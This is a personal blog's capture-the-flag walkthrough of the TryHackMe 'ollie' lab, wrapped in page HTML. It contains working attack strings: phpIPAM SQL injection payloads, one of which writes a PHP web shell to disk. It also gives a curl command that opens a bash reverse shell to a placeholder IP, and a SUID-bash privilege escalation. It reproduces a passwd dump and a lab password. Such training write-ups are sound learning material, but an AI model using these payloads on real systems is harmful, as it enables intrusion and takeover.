@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="ro-ro">
+<head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">ollie | Cyber Blog-ul lui Novac</title>
+<meta property="og:title" content="ollie | Cyber Blog-ul lui Novac" />
+<meta name="twitter:title" content="ollie | Cyber Blog-ul lui Novac" />
+<meta itemprop="name" content="ollie | Cyber Blog-ul lui Novac" />
+<meta name="application-name" content="ollie | Cyber Blog-ul lui Novac" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="">
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+<meta property="og:locale" content="ro-ro" />
+<meta name="language" content="ro-ro" />
+
+  <link rel="alternate" hreflang="en" href="https://novaclearnscyber.github.io/blog/posts/ollie/" title="" />
+
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2026-03-02T13:27:59Z />
+    <meta property="article:published_time" content=2026-03-02T13:27:59Z />
+    <meta property="og:url" content="https://novaclearnscyber.github.io/blog/posts/ollie/" />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "ollie",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2026-03-02",
+        "description": "",
+        "wordCount":  640 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2026-03-02",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "Cyber Blog-ul lui Novac"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.152.2">
+
+    
+    <meta property="og:url" content="https://novaclearnscyber.github.io/blog/posts/ollie/">
+  <meta property="og:site_name" content="Cyber Blog-ul lui Novac">
+  <meta property="og:title" content="ollie">
+  <meta property="og:description" content="link : https://tryhackme.com/room/ollie
+desc:
+lets run port scan
+pretty clasic but also something interesting is open , the waste service
+lets google it
+ok ok interesting
+lets check also the web server
+a simple login page , that i allready find an exploit for , looking in the button of the page
+https://www.exploit-db.com/exploits/50963
+the exploit
+i runned it and it requires an user and a password
+i connect to the waste service via nc then i obtained a password and an username
+i used the m to login in to the site">
+  <meta property="og:locale" content="ro_ro">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:modified_time" content="2026-03-02T13:27:59+00:00">
+    <meta property="article:tag" content="Note">
+    <meta property="article:tag" content="Journal">
+    <meta property="article:tag" content="CyberStuff">
+
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="ollie">
+  <meta name="twitter:description" content="link : https://tryhackme.com/room/ollie
+desc:
+lets run port scan
+pretty clasic but also something interesting is open , the waste service
+lets google it
+ok ok interesting
+lets check also the web server
+a simple login page , that i allready find an exploit for , looking in the button of the page
+https://www.exploit-db.com/exploits/50963
+the exploit
+i runned it and it requires an user and a password
+i connect to the waste service via nc then i obtained a password and an username
+i used the m to login in to the site">
+
+
+    
+
+    <link rel="canonical" href="https://novaclearnscyber.github.io/blog/posts/ollie/">
+    <link href="https://novaclearnscyber.github.io/blog/style.min.e390ba7da26222f4dc42a349955d76dbbe44e5ce2535a43de5a70633a0a9ec3c.css" rel="stylesheet">
+    <link href="https://novaclearnscyber.github.io/blog/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="https://novaclearnscyber.github.io/blog/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://novaclearnscyber.github.io/blog/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://novaclearnscyber.github.io/blog/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="https://novaclearnscyber.github.io/blog/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="https://novaclearnscyber.github.io/blog/favicon.ico">
+
+
+
+
+<link rel="manifest" href="https://novaclearnscyber.github.io/blog/site.webmanifest">
+
+<meta name="msapplication-config" content="/blog/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+    <meta name="color-scheme" content="light dark">
+
+    
+    <link rel="icon" type="image/svg+xml" href="https://novaclearnscyber.github.io/blog/icons/favicon.svg">
+
+    
+    
+    
+      
+<link rel="icon" type="image/png" href="https://novaclearnscyber.github.io/blog/favicon.png">
+<link rel="shortcut icon" href="https://novaclearnscyber.github.io/blog/favicon.png">
+    
+</head>
+
+
+<body>
+    <nav>
+    <div class="logo">
+        <a href="https://novaclearnscyber.github.io/blog/" title="Cyber Blog-ul lui Novac">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title></title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+    </div>
+    
+</nav>
+
+    <style>
+        .custom-banner {
+            width: 100%;
+
+            height: {
+                    {
+                    .Site.Params.banner_height | default "300px"
+                }
+            }
+
+            ;
+            overflow: hidden;
+            position: relative;
+        }
+
+        @media (max-width: 768px) {
+            .custom-banner {
+                height: 200px !important;
+                 
+            }
+        }
+    </style>
+
+    
+    <div class="custom-banner">
+        <div
+            style="background-image: url('https://novaclearnscyber.github.io/blog/static/siteBackcopy.png'); width: 100%; height: 100%; background-size: cover; background-position: center;">
+        </div>
+    </div>
+    
+
+    <div id="content">
+        
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">ollie</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2026-03-02T13:27:59&#43;00:00" itemprop="datePublished"> Mar 2, 2026 </time>
+                </div>
+                
+            </header>
+            
+            <div class="page-content">
+                <p>link : <a href="https://tryhackme.com/room/ollie">https://tryhackme.com/room/ollie</a><br>
+desc:<img src="https://share.note.sx/files/ql/ql8lw920aq696buvxt3t.png" alt=""></p>
+<p>lets run port scan<br>
+<img src="https://share.note.sx/files/3q/3qkcil8pdxsz86gz744g.png" alt=""></p>
+<p>pretty clasic but also something interesting is open , the waste service<br>
+lets google it<br>
+<img src="https://share.note.sx/files/sv/svbq80ilbuki4am8eyri.png" alt=""><br>
+ok ok interesting</p>
+<p>lets check also the web server<br>
+<img src="https://share.note.sx/files/yn/ynua0c37ckvu3b235a0e.jpg" alt=""><br>
+a simple login page , that i allready find an exploit for , looking in the button of the page<br>
+<a href="https://www.exploit-db.com/exploits/50963">https://www.exploit-db.com/exploits/50963</a><br>
+the exploit</p>
+<p>i runned it and it requires an user and a password<br>
+<img src="https://share.note.sx/files/jp/jpf96pwpb6ubapj82fr9.png" alt=""></p>
+<p>i connect to the waste service via nc then i obtained a password and an username<br>
+<img src="https://share.note.sx/files/cb/cbzg4u4mpa8isoeskfe0.jpg" alt=""><br>
+i used the m to login in to the site<br>
+<img src="https://share.note.sx/files/oj/ojwyy5d2c5jc7wjrkbup.jpg" alt=""></p>
+<p>lets run also a subdomain enumeration<br>
+<img src="https://share.note.sx/files/bf/bfj82s0prllvxa9t1z8v.jpg" alt=""><br>
+ok interesting lets check misc<br>
+<img src="https://share.note.sx/files/kf/kf4i1u7m5dk044t0jiqa.png" alt=""><br>
+ok ok nice<br>
+<img src="https://share.note.sx/files/hm/hmm2y5xmr91mc74ke12w.png" alt=""><br>
+somthing interesting to investigate<br>
+<img src="https://share.note.sx/files/dh/dhb1hc7x6sswxxx5zfhm.png" alt=""></p>
+<p>in those document we can see something interesting about sql injections , lets search something phpipam with sql injections</p>
+<p>so lets go to the main panel<br>
+<img src="https://share.note.sx/files/lw/lwvypkcexzjz8u20mzw8.jpg" alt=""><br>
+go to all tools in the center<br>
+<img src="https://share.note.sx/files/vh/vhzzqrfl1ueagyme46gj.jpg" alt=""><br>
+here select routing<br>
+<img src="https://share.note.sx/files/23/238q13yzp4fuivm1r40y.jpg" alt=""><br>
+click on this is the one<br>
+<img src="https://share.note.sx/files/ca/capylh39ssud00b2ipwz.jpg" alt=""><br>
+click the action , select subnet mapping<br>
+<img src="https://share.note.sx/files/5p/5pig6iz0ho0lx4q6kh7n.jpg" alt=""><br>
+and in the map new subnet insert the following string <code>&quot; union select @@version,2,user(),4 -- -</code> to perform an sql injection<br>
+<img src="https://share.note.sx/files/1n/1nbynv9wq14a8m0aw5yo.png" alt=""><br>
+and we do find something</p>
+<p>i opened burbsuite with interceptor to try to execute an sql injection</p>
+<p><img src="https://share.note.sx/files/9a/9azkqyio5411id1ilg9a.jpg" alt=""><br>
+go again in the same spot and lets intercept the string<br>
+<img src="https://share.note.sx/files/v7/v7i0sl1l5u8iibn2lm8s.jpg" alt=""></p>
+<p>put the same string in<br>
+<img src="https://share.note.sx/files/ky/kyto8l7beisl4gx5n50y.png" alt=""><br>
+send it to repeater<br>
+<img src="https://share.note.sx/files/ra/raxvhqx9gjnv9cdv4sui.png" alt=""></p>
+<p><img src="https://share.note.sx/files/t9/t9195u8boq1ox8xoaiec.png" alt=""></p>
+<p>here select and use &lsquo;CTRL + SHIFT + U &rsquo; to url decode</p>
+<p><img src="https://share.note.sx/files/2b/2bamf2zvtheu3geimfb5.png" alt=""></p>
+<p>insert the following string and select like in the picture to execute an sql injection<br>
+to **url encode press &lsquo;ctrl+u&rsquo;<br>
+it should look like that<br>
+<img src="https://share.note.sx/files/1l/1l3qxfz6nrr3dd87gjaw.png" alt=""><br>
+and per per patamin we have paswd file</p>
+<p><img src="https://share.note.sx/files/7v/7vy8w9bdsm39n16xlmdw.png" alt=""></p>
+<p><code>'root:x:0:0:root:/root:/bin/bash</code><br>
+<code>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</code><br>
+<code>bin:x:2:2:bin:/bin:/usr/sbin/nologin</code><br>
+<code>sys:x:3:3:sys:/dev:/usr/sbin/nologin</code><br>
+<code>sync:x:4:65534:sync:/bin:/bin/sync</code><br>
+<code>games:x:5:60:games:/usr/games:/usr/sbin/nologin</code><br>
+<code>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</code><br>
+<code>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</code><br>
+<code>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</code><br>
+<code>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</code><br>
+<code>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</code><br>
+<code>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</code><br>
+<code>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</code><br>
+<code>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</code><br>
+<code>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</code><br>
+<code>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</code><br>
+<code>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</code><br>
+<code>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</code><br>
+<code>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</code><br>
+<code>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/3 (4)'</code></p>
+<p>i also decided to edit a lil bit the file we want to read and put something else there<br>
+<img src="https://share.note.sx/files/du/duoosbvk36jr9qyhk23o.png" alt=""><br>
+and we get the document root<br>
+<img src="https://share.note.sx/files/l4/l49rmwckdgvau5u0e6bu.png" alt=""></p>
+<p>ok but i cant effect the sistem any way like that , so lets try something else<br>
+<img src="https://share.note.sx/files/d1/d1ek3p0yhkijd19587zv.png" alt=""><br>
+here i created another instancer for the repeater where i will try to write php files<br>
+subnet=&quot;+union+select+(select &lsquo;&rsquo;),2,3,4+&ndash;+-&amp;bgp_id=1<br>
+i used the following string</p>
+<p>so make the following selection<br>
+<img src="https://share.note.sx/files/ar/arue1wfugciw0xj5ekch.png" alt=""><br>
+click ctrl + u to url encode<br>
+it should look like that after<br>
+<img src="https://share.note.sx/files/gh/gheki9e73o36k8cysybr.png" alt=""><br>
+send it and we should get something like that<br>
+<img src="https://share.note.sx/files/r5/r5yo54krccdryz3v8jzw.png" alt=""><br>
+is an error but is good</p>
+<p>lets try something else<br>
+insert the followng string then make the following selection to url encode<br>
+<img src="https://share.note.sx/files/wu/wur465m6pu7uy8iu9da4.png" alt=""><br>
+it should look something like that<br>
+<code>subnet=&quot;+union+select+(&quot;&lt;?php+system($_REQUEST['rse'])%3b+%3f&gt;&quot;),2,3,4+into+outfile'/var/www/html/rse.php'--+-&amp;bgp_id=1</code></p>
+<p>here is the string if u need it</p>
+<p>again a good error<br>
+<img src="https://share.note.sx/files/ua/uamtyaj3bzf3y4bvgxht.png" alt=""><br>
+and if we acces the page we see that we have remote acces<br>
+<img src="https://share.note.sx/files/v9/v9fvmselknw2nyryx6dt.png" alt=""></p>
+<p>very nice , now lets try to get a revers shell, open a port to listen<br>
+<img src="https://share.note.sx/files/s5/s5uuxzgp8c0ma5e9xj5i.png" alt=""></p>
+<p>in another terminal exicute this <code>curl 'http://SITEIP/rse.php' --data-urlencode &quot;rse=bash -c 'bash -i &gt;&amp; /dev/tcp/YUORIP/1234 0&gt;&amp;1'&quot;</code></p>
+<p><img src="https://share.note.sx/files/vr/vr1l8hnquw9cas42981w.png" alt=""><br>
+and boom ee have an reverse shell</p>
+<p>now we can upgrade the shell <img src="https://share.note.sx/files/8k/8kxvdr4mi9crhfgs49yi.png" alt=""><br>
+ctrl z to background<br>
+<img src="https://share.note.sx/files/et/etbt7txavs69lihtsbug.png" alt=""></p>
+<p>to bring back the shell<br>
+<img src="https://share.note.sx/files/lm/lmm280go8w44ne9dcshl.png" alt=""><br>
+<img src="https://share.note.sx/files/fh/fhajjmgiyxd83qiy4xfj.png" alt=""><br>
+to upgrade the shell , this will make it a lot easier to work with the shell</p>
+<p>pass:OllieUnixMontgomery!</p>
+<p>if we list the user we can find olli , and i tried the password from the 1337 port and it worked<br>
+<img src="https://share.note.sx/files/2l/2l5fmo0par5e1c6hhluf.png" alt=""><br>
+and if we ls we find the user flag<br>
+now i will make a ssh conection betwen us two<br>
+<img src="https://share.note.sx/files/zw/zwy1kkyvzpraovsignog.jpg" alt=""><img src="https://share.note.sx/files/b5/b5wv5hpfphpzjnri1fab.png" alt=""><br>
+and we ssh now<br>
+v<img src="https://share.note.sx/files/ge/ge4mqk31szj5ntgpkoit.png" alt=""><br>
+i alos opened an python server<br>
+<img src="https://share.note.sx/files/5b/5bf8erg5vivni9iua2p0.png" alt=""><br>
+and we gonna use pspy64 to get it<br>
+i downloaded pspy 64 from this link :<a href="https://github.com/DominicBreuker/pspy?tab=readme-ov-file">https://github.com/DominicBreuker/pspy?tab=readme-ov-file</a><br>
+<img src="https://share.note.sx/files/cq/cqyu7c89b4yqe0wd2z1v.png" alt=""></p>
+<p>and used wget with a python server to get it<br>
+change the chmod +x and run it <img src="https://share.note.sx/files/vv/vv5dhd211bxlkkf7c5oc.png" alt=""></p>
+<p>running the script we se an interesting file<br>
+<img src="https://share.note.sx/files/fg/fgyxnugiwsntb9kp23lw.png" alt=""><br>
+the feedme file , lets check it out<br>
+we can locate it in /usr/bin/feedme<br>
+what i did here is to write chmod u+s /bin/bash to upgrade the bash<br>
+<img src="https://share.note.sx/files/x2/x2p5japvkj0egs1h1d4s.png" alt=""></p>
+<p>and boom<br>
+<img src="https://share.note.sx/files/np/np5ktg0ywmdqkkgu6stm.png" alt=""><br>
+we are the root<br>
+<img src="https://share.note.sx/files/tp/tpi31as77umv08x8349y.png" alt=""><br>
+and boom the flag</p>
+
+            </div>
+        </article></main>
+</div>
+
+    </div>
+    <footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+</div>
+    <small class="footer_copyright">
+        © 2026 .
+        
+    </small>
+</footer>
+</body>
+
+</html>
